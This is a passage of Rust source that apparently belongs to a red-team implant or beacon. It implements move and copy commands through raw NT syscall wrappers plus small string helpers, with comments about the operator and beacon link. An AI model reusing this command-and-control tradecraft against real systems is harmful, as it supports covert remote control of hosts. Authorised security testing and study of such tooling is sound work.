fn fileop_mv(rt: &Runtime, path: &str, dest: &str) -> Response {
    if !allowed(path) {
        return Response::Err(String::from("mv: refusing protected src"));
    }
    if !allowed(dest) {
        return Response::Err(String::from("mv: refusing protected dest"));
    }
    let destbuf = match to_nt_path(dest) {
        Some(p) => p,
        None => return Response::Err(String::from("mv: invalid dest path")),
    };
    unsafe {
        let handle = match open_file(
            rt,
            path,
            // DELETE alone isn't mapped to include SYNCHRONIZE, so OR it in —
            // FILE_SYNCHRONOUS_IO_NONALERT below requires it.
            DELETE_ACCESS | SYNCHRONIZE,
            FILE_OPEN,
            // NO FILE_NON_DIRECTORY_FILE here: rm must accept BOTH files and
            // directories (the operator may rm either). NON_DIRECTORY_FILE
            // would reject a directory with STATUS_FILE_IS_A_DIRECTORY.
            FILE_SYNCHRONOUS_IO_NONALERT,
        ) {
            Ok(h) => h,
            Err(OpenError::BadPath) => return Response::Err(String::from("mv: invalid src path")),
            Err(OpenError::Unresolved) => {
                return Response::Err(String::from("mv: NtCreateFile unresolved"))
            }
            Err(OpenError::Status(s)) => {
                return Response::Err(String::from(format_ntstatus("mv open", s)))
            }
        };
        // Build FILE_RENAME_INFORMATION. FileName is an in-place wide array —
        // copy destbuf into it (capped at 260 chars).
        let mut info: FileRenameInformation = core::mem::zeroed();
        info.replace_if_exists = 1;
        let dn = destbuf.len().min(info.file_name.len());
        info.file_name[..dn].copy_from_slice(&destbuf[..dn]);
        info.file_name_length = (dn * 2) as u32;
        let mut set_iosb: IoStatusBlock = IoStatusBlock::default();
        // The information length is the fixed header (offset of file_name) +
        // the wide name bytes actually used. NtSetInformationFile reads exactly
        // that many bytes.
        // FILE_RENAME_INFORMATION header on x64 is 20 bytes (ReplaceIfExists:1
        // +pad:7 +RootDirectory:8 +FileNameLength:4 = 20) before FileName[].
        // NtSetInformationFile needs Length >= 20 + FileNameLength to read the
        // whole name; the old `16 + ...` was 4 short and truncated the rename.
        let info_len = 20 + info.file_name_length as usize;
        let sst = crate::syscalls::nt_set_information_file(
            rt,
            handle as usize,
            &mut set_iosb as *mut IoStatusBlock as usize,
            &mut info as *mut FileRenameInformation as usize,
            info_len,
            FILE_RENAME_INFO_CLASS,
        );
        let _ = crate::syscalls::nt_close(rt, handle as usize);
        match sst {
            Some(s) if nt_success(s) => Response::Ok,
            Some(s) => Response::Err(String::from(format_ntstatus("mv", s))),
            None => Response::Err(String::from("mv: NtSetInformationFile unresolved")),
        }
    }
}

/// Cp: open src (read), open dest (write), copy in CHUNK blocks, close both.
fn fileop_cp(rt: &Runtime, path: &str, dest: &str) -> Response {
    if !allowed(path) {
        return Response::Err(String::from("cp: refusing protected src"));
    }
    if !allowed(dest) {
        return Response::Err(String::from("cp: refusing protected dest"));
    }
    // Read source fully into memory-bounded chunks. (Capped: a multi-GB file
    // would OOM; for an engagement tool the operator controls the path, and the
    // beacon wire caps make huge files impractical over the link anyway.)
    let src_chunks: Vec<Vec<u8>> = unsafe {
        let handle = match open_file(
            rt,
            path,
            GENERIC_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        ) {
            Ok(h) => h,
            Err(OpenError::BadPath) => return Response::Err(String::from("cp: invalid src path")),
            Err(OpenError::Unresolved) => {
                return Response::Err(String::from("cp: src NtCreateFile unresolved"))
            }
            Err(OpenError::Status(s)) => {
                return Response::Err(String::from(format_ntstatus("cp src", s)))
            }
        };
        let mut out: Vec<Vec<u8>> = Vec::new();
        let mut buf = crate::heap::vec![0u8; CHUNK];
        loop {
            let mut read_iosb: IoStatusBlock = IoStatusBlock::default();
            let rst = crate::syscalls::nt_read_file(
                rt,
                handle as usize,
                0,
                0,
                0,
                &mut read_iosb as *mut IoStatusBlock as usize,
                buf.as_mut_ptr() as usize,
                CHUNK as usize,
                0,
                0,
            );
            let status = match rst {
                Some(s) => s,
                None => {
                    let _ = crate::syscalls::nt_close(rt, handle as usize);
                    return Response::Err(String::from("cp: NtReadFile unresolved"));
                }
            };
            let got = read_iosb.information.min(CHUNK);
            if status == STATUS_END_OF_FILE || got == 0 {
                break;
            }
            // A non-EOF negative status is a real read error — surface it
            // instead of appending a partial chunk.
            if status < 0 {
                let _ = crate::syscalls::nt_close(rt, handle as usize);
                return Response::Err(String::from(format_ntstatus("cp read", status)));
            }
            out.push(buf[..got].to_vec());
        }
        let _ = crate::syscalls::nt_close(rt, handle as usize);
        out
    };

    // Write dest (open once, write each chunk sequentially).
    unsafe {
        let handle = match open_file(
            rt,
            dest,
            GENERIC_WRITE,
            FILE_OVERWRITE_IF,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        ) {
            Ok(h) => h,
            Err(OpenError::BadPath) => return Response::Err(String::from("cp: invalid dest path")),
            Err(OpenError::Unresolved) => {
                return Response::Err(String::from("cp: dest NtCreateFile unresolved"))
            }
            Err(OpenError::Status(s)) => {
                return Response::Err(String::from(format_ntstatus("cp dest", s)))
            }
        };
        for chunk in &src_chunks {
            let mut w_iosb: IoStatusBlock = IoStatusBlock::default();
            let wst = crate::syscalls::nt_write_file(
                rt,
                handle as usize,
                0,
                0,
                0,
                &mut w_iosb as *mut IoStatusBlock as usize,
                chunk.as_ptr() as usize,
                chunk.len() as usize,
                0,
                0,
            );
            if !matches!(wst, Some(s) if nt_success(s)) {
                let _ = crate::syscalls::nt_close(rt, handle as usize);
                return match wst {
                    None => Response::Err(String::from("cp: NtWriteFile unresolved")),
                    Some(s) => Response::Err(String::from(format_ntstatus("cp write", s))),
                };
            }
        }
        let _ = crate::syscalls::nt_close(rt, handle as usize);
    }
    Response::Ok
}

// ---- small helpers --------------------------------------------------------

/// Extract the trailing path component as the chunk `name` (for Download).
fn basename(path: &str) -> String {
    let trimmed = path.trim_end_matches(['/', '\\']);
    match trimmed.rsplit(['/', '\\']).next() {
        Some(b) if !b.is_empty() => String::from(b),
        _ => String::from(path),
    }
}

/// Format an NTSTATUS as a short error string (no `format!` ergonomics for
/// hex under no_std — we build "op: ntstatus <dec>" which is enough to triage).
fn format_ntstatus(op: &str, status: i32) -> String {
    let mut s = String::from(op);
    s.push_str(": ntstatus ");
    // Decimal is fine for triage; the operator can map known codes.
    let mut buf = [0u8; 12];
    let n = itoa_into(status as u32, &mut buf);
    s.push_str(core::str::from_utf8(&buf[..n]).unwrap_or("?"));
    s
}

/// Tiny u32 → ASCII decimal writer. Returns the number of bytes written.
fn itoa_into(mut v: u32, out: &mut [u8]) -> usize {
    if v == 0 {
        out[0] = b'0';
        return 1;
    }
    let mut tmp = [0u8; 10];
    let mut i = tmp.len();
    while v != 0 {
        i -= 1;
        tmp[i] = b'0' + (v % 10) as u8;
        v /= 10;
    }
    let n = tmp.len() - i;
    out[..n].copy_from_slice(&tmp[i..]);
    n
}
